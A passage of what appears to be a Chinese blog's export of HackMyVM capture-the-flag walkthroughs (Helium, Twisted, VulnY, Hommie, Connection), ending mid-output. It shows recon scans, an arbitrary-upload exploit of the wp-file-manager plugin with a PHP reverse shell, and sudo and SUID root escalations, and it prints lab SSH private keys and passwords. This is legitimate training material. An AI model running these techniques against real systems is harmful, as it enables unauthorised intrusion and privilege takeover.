5.有实力的可以尝试着修复漏洞\n\nphpstudy将web服务启动，是一个EMGLOG服务，后台的账号密码是admin/123456\n\nhttps://blog.csdn.net/W13680336969/article/details/137267677\n\n打上最新的补丁，并把admin的密码改掉\n\n# 6.非预期\n\n桌面上有一个解体的校验程序，和kuang一样，exe->pyc然后反编译\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/5.png)\n","tags":["靶机"],"categories":["应急响应"]},{"title":"HackmyVM-Helium","url":"/2025/01/26/HackmyVM-Helium/","content":"\n\n\n#  信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.178  08:00:27:d1:eb:7a       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.217  b4:0f:b3:8e:31:07       vivo Mobile Communication Co., Ltd.\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.000 seconds (128.00 hosts/sec). 5 responded\n~~~\n\nip是192.168.31.178，nmap扫描一下端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.178 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 01:27 EST\nNmap scan report for helium (192.168.31.178)\nHost is up (0.0046s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D1:EB:7A (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 20.85 seconds\n~~~\n\n# 80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl 192.168.31.178\n<title>RELAX</title>\n<!doctype html>\n<html lang=\"en\">\n\n<!-- Please paul, stop uploading weird .wav files using /upload_sound -->\n\n<head>\n<style>\nbody {\n  background-image: url('screen-1.jpg');\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: 100% 100%;\n}\n</style>\n    <link href=\"bootstrap.min.css\" rel=\"stylesheet\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n</head>\n\n<body>\n<audio src=\"relax.wav\" preload=\"auto loop\" controls></audio>\n</body>\n~~~\n\n有注释paul可能是ssh的账号，relax.wav下载下了之后没有东西，/bootstrap.min.css给了一个wav文件，用Audacity分析频谱能发现`dancingpassyo`，ssh登录试试，登录成功\n\n# 提权\n\n~~~\npaul@MiWiFi-RA71-srv:~$ sudo -l\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\nMatching Defaults entries for paul on MiWiFi-RA71-srv:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser paul may run the following commands on MiWiFi-RA71-srv:\n    (ALL : ALL) NOPASSWD: /usr/bin/ln\n~~~\n\n~~~\npaul@MiWiFi-RA71-srv:~$ sudo ln  -fs /bin/sh /bin/usr/ln\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\n# id\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\n提权成功\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Twisted","url":"/2025/01/24/HackmyVM-Twisted/","content":"\n# \n\n\n\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.22   08:00:27:63:fe:59       PCS Systemtechnik GmbH\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded\n~~~\n\nip为192.168.31.22.  nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.22 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 02:14 EST\nStats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 95.30% done; ETC: 02:15 (0:00:01 remaining)\nNmap scan report for twisted (192.168.31.22)\nHost is up (0.0065s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\nMAC Address: 08:00:27:63:FE:59 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 22.61 seconds\n~~~\n\n2222端口为ssh端口\n\n# 80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl 192.168.31.22\n<h1>I love cats!</h1>\n<img src=\"cat-original.jpg\" alt=\"Cat original\"  width=\"400\" height=\"400\">\n<br>\n\n<h1>But I prefer this one because seems different</h1>\n\n<img src=\"cat-hidden.jpg\" alt=\"Cat Hidden\" width=\"400\" height=\"400\">\n~~~\n\n80端口存在两张jpg图片\n\n下载下了用stegseek查看\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# stegseek cat-original.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"westlife\"\n[i] Original filename: \"markus.txt\".\n[i] Extracting to \"cat-original.jpg.out\".\n\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# stegseek cat-hidden.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"sexymama\"\n[i] Original filename: \"mateo.txt\".\n[i] Extracting to \"cat-hidden.jpg.out\".\n~~~\n\n给了两个ssh的账号密码\n\n# 提权\n\n先登录markus\n\n~~~\nmarkus@MiWiFi-RA71-srv:~$ cat note.txt\nHi bonita,\nI have saved your id_rsa here: /var/cache/apt/id_rsa\nNobody can find it.\n~~~\n\n给了一个提示，是bonita用户的id_rsa\n\nsuid提权看看\n\n~~~\nmarkus@MiWiFi-RA71-srv:~$ find / -perm -u=s 2>/dev/null\n/home/bonita/beroot\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n~~~\n\n`/home/bonita/beroot`这个很可疑但是没有权限，登录mateo看看\n\n~~~\nmateo@MiWiFi-RA71-srv:~$ cat note.txt\n/var/www/html/gogogo.wav\n~~~\n\n下载下了，用Audacity查看，能发现这是莫斯，解码得到\n\n~~~\nGO DEEPER... COME WITH ME... LITTLE RABBIT...\n~~~\n\n没啥用\n\n~~~\nmateo@MiWiFi-RA71-srv:~$ /usr/sbin/getcap -r / 2>/dev/null\n/usr/bin/ping = cap_net_raw+ep\n/usr/bin/tail = cap_dac_read_search+ep\n~~~\n\ngetcap可以查看文件的特殊权限，tail可以读取\n\n~~~\nmateo@MiWiFi-RA71-srv:~$ tail /var/cache/apt/id_rsa -n 100\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd\nFyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS\nolvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1\nvD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF\ngFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C\ntt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM\ngl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC\nxCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8\nDcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H\nuN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD\nXhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu\nU3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI\nmZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/\nhmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro\nnxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK\nmPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+\nbUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq\nyzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP\nUvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh\nV2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ\nLlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz\na0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF\neERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu\nD0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\nssh登陆，将beroot下载ida分析\n\n~~~\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+1Ch] [rbp-4h] BYREF\n\n  printf(\"Enter the code:\\n \");\n  scanf(\"%i\", &v4);\n  if ( v4 == 5880 )\n  {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash\");\n  }\n  else\n  {\n    puts(\"\\nWRONG\");\n  }\n  return 0;\n}\n~~~\n\n只要输入等于5880就会执行/bin/bash\n\n~~~\nbonita@MiWiFi-RA71-srv:~$ ./beroot\nEnter the code:\n 5880\nroot@MiWiFi-RA71-srv:~#\n~~~\n\n提权结束\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-VulnY","url":"/2025/01/24/HackmyVM-VulnY/","content":"\n\n\n# 信息搜集\n\n~~~\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.165  08:00:27:6c:16:9b       PCS Systemtechnik GmbH\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 4 responded\n~~~\n\nip为192.168.31.165 ，nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.165 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 00:19 EST\nNmap scan report for vulny (192.168.31.165)\nHost is up (0.049s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT      STATE SERVICE\n80/tcp    open  http\n33060/tcp open  mysqlx\nMAC Address: 08:00:27:6C:16:9B (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 28.56 seconds\n~~~\n\n开了一个mysql服务和http的服务\n\n# 80端口\n\n扫描目录能扫出来有一个secret的目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl http://192.168.31.165/secret/\nNeither <b>/etc/wordpress/config-192.168.31.165.php</b> nor <b>/etc/wordpress/config-168.31.165.php</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username\n~~~\n\n提示了要去看/etc/wordpress/config-168.31.165.php，可以看出来这是一个wordpress的框架，wp-content存在目录遍历\n\n在`Index of /secret/wp-content/uploads/2020/10`这里能发现一个压缩包wp-file-manager-6.O.zip，这个插件存在任意文件上传\n\n~~~\ncurl -F cmd=upload -F target=l1_ -F upload[]=@rev.php -XPOST \"http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\"\n~~~\n\n上传一个反弹shell的文件\n\n访问http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/files/rev.php\n\n进行反弹shell\n\n~~~\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n~~~\n\n# 提权\n\ncd进/etc/wordpress，\n\n~~~\nwww-data@vulny:/etc/wordpress$ ls\nls\nconfig-192.168.1.122.php  htaccess\n~~~\n\n文件名和80端口的不一样，猜测可能是80端口是ip地址输出的文件名\n\n~~~\nwww-data@vulny:/etc/wordpress$ cat c*\ncat c*\n<?php\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wordpress');\ndefine('DB_PASSWORD', 'myfuckingpassword');\ndefine('DB_HOST', 'localhost');\ndefine('DB_COLLATE', 'utf8_general_ci');\ndefine('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');\n?>\n~~~\n\n给了mysql的账号密码，这还有wordpress的路径，查看wp-config.php有一行注释很突出\n\n~~~\n/* idrinksomewater */\n~~~\n\n登录mysql，找不到有用的东西\n\n查看/etc/passwd有一个adrian可以登录，注释就是密码\n\n~~~\nwww-data@vulny:/usr/share/wordpress$ su adrian\nsu adrian\nPassword: idrinksomewater\n\nadrian@vulny:/usr/share/wordpress$\n~~~\n\n~~~\nadrian@vulny:/$ sudo -l\nsudo -l\nMatching Defaults entries for adrian on vulny:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser adrian may run the following commands on vulny:\n    (ALL : ALL) NOPASSWD: /usr/bin/flock\n~~~\n\n~~~\nadrian@vulny:/$ sudo -u root /usr/bin/flock -u / /bin/bash\nsudo -u root /usr/bin/flock -u / /bin/bash\nroot@vulny:/\n~~~\n\n提权成功\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Hommie","url":"/2025/01/23/HackmyVM-Hommie/","content":"\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n192.168.31.116  08:00:27:26:b1:6f       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n~~~\n\nip为192.168.31.116，nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.116 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 EST\nNmap scan report for hommie (192.168.31.116)\nHost is up (0.00041s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 10.27 seconds\n~~~\n\n# 80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl 192.168.31.116\nalexia, Your id_rsa is exposed, please move it!!!!!\nIm fighting regarding reverse shells!\n-nobody\n~~~\n\n80端口目录也扫描不到，只给了一个提示，alexia的id_rsa泄露了，去看21端口\n\n# 21端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ftp anonymous@192.168.31.116\nConnected to 192.168.31.116.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||35772|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0               0 Sep 30  2020 index.html\n226 Directory send OK.\nftp> ls -al\n229 Entering Extended Passive Mode (|||35347|)\n150 Here comes the directory listing.\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 .\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 ..\ndrwxrwxr-x    2 0        113          4096 Jan 23 06:12 .web\n-rw-r--r--    1 0        0               0 Sep 30  2020 index.html\n226 Directory send OK.\nftp> cd .web\n250 Directory successfully changed.\nftp> ls\n229 Entering Extended Passive Mode (|||27864|)\n150 Here comes the directory listing.\n-rw-r--r--    1 106      113            35 Jan 23 06:12 1.phtml\n-rw-r--r--    1 0        0              99 Sep 30  2020 index.html\n-rw-r--r--    1 106      113          5493 Jan 23 06:09 rev.php\n226 Directory send OK.\n~~~\n\n21端口有匿名登录，存在.web目录，可以往80端口传文件，但是不解析php，只能放弃\n\n# tftp\n\n扫描udp端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 EST\nNmap scan report for hommie (192.168.31.116)\nHost is up (0.00053s latency).\n\nPORT      STATE         SERVICE\n53/udp    closed        domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   open|filtered ntp\n135/udp   closed        msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   closed        snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   closed        syslog\n520/udp   open|filtered route\n631/udp   open|filtered ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\nMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.95 seconds\n~~~\n\ntftp的服务开着，结合80端口给的提示\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# tftp 192.168.31.116\ntftp> get id_rsa\n~~~\n\n可以下载下来alexia的id_rsa\n\nssh登录\n\n# 提权\n\n找有suid的命令\n\n~~~\nalexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2>/dev/null\n/opt/showMetheKey\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/umount\n~~~\n\n`/opt/showMetheKey`很可疑啊,运行一下\n\n~~~\nalexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7\nV0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y\nRn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT\ngCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j\nQMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq\nkyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI\nM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM\ndgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW\nrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B\ntIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T\nd/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/\n+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE\nUa47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w\npmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk\nWeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz\nbu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu\n3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6\n0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z\nHlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs\ny6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY\nOZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08\nQPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp\nivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN\n0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\n把alexia的id_rsa输出了，将这个二进制文件拖下来放进ida看看\n\n~~~\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  setuid(0);\n  setgid(0);\n  system(\"cat $HOME/.ssh/id_rsa\");\n  return 0;\n\n~~~\n\n他是查看环境变量里HOME变量下的.ssh/id_rsa,可以修改HOME变量读取root的id_rsa\n\n~~~\nalexia@MiWiFi-RA71-srv:~$ export HOME=/root\nalexia@MiWiFi-RA71-srv:/home/alexia$ env\nSHELL=/bin/bash\nPWD=/home/alexia\nLOGNAME=alexia\nXDG_SESSION_TYPE=tty\nHOME=/root\n~~~\n\n再次运行拿到root的id_rsa，登录即可\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Connection","url":"/2025/01/22/HackmyVM-Connection/","content":"\n\n\n\n\n\n\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/script]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.77   08:00:27:2a:5f:aa       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded\n~~~\n\nip为192.168.31.77，nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/script]\n└─# nmap 192.168.31.77 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 EST\nNmap scan report for connection (192.168.31.77)\nHost is up (0.00064s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 11.11 seconds\n~~~\n\n# 445端口\n\n开启了445端口\n\n用enum4linux进行枚举\n\n~~~\n =================================( Share Enumeration on 192.168.31.77 )=================================\n\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        share           Disk\n        print$          Disk      Printer Drivers\n        IPC$            IPC       IPC Service (Private Share for uploading files)\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            -------\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            CONNECTION\n\n[+] Attempting to map shares on 192.168.31.77\n\n//192.168.31.77/share   Mapping: OK Listing: OK Writing: N/A\n//192.168.31.77/print$  Mapping: DENIED Listing: N/A Writing: N/A\n\n[E] Can't understand response:\n\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\n//192.168.31.77/IPC$    Mapping: N/A Listing: N/A Writing: N/A\n~~~\n\nsmbclint可以匿名登陆share里有一个html，随便往里传一个文件发现在80端口访问到，传一个反弹shell的php文件\n\n~~~\n┌──(root㉿kali)-[~/Desktop/script]\n└─# smbclient  //192.168.31.77/share\nPassword for [WORKGROUP\\root]:\nAnonymous login successful\nsmb: \\> cd html\\\nsmb: \\html\\>\nsmb: \\html\\> put rev.php\nputting file rev.php as \\html\\rev.php (447.0 kb/s) (average 447.0 kb/s)\nsmb: \\html\\> exit\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/script]\n└─# nc -lvnp 5555\nlistening on [any] 5555 ...\nconnect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632\nLinux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux\n 09:12:44 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$\n~~~\n\n接收到shell了\n\n# 提权\n\n用python获得一个更好的终端\n\n~~~\n$  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@connection:/$\n~~~\n\n查找suid文件\n\n~~~\nwww-data@connection:/$ find / -perm -u=s 2>/dev/null\nfind / -perm -u=s 2>/dev/null\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/gdb\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/mount\n/usr/bin/gpassw\n~~~\n\n可以利用gdb进行suid提权\n\nhttps://gtfobins.github.io/gtfobins/gdb/\n\n~~~\nwww-data@connection:/$ gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\n<mport os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\nGNU gdb (Debian 8.2.1-2+b3) 8.2.1\nCopyright (C) 2018 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or 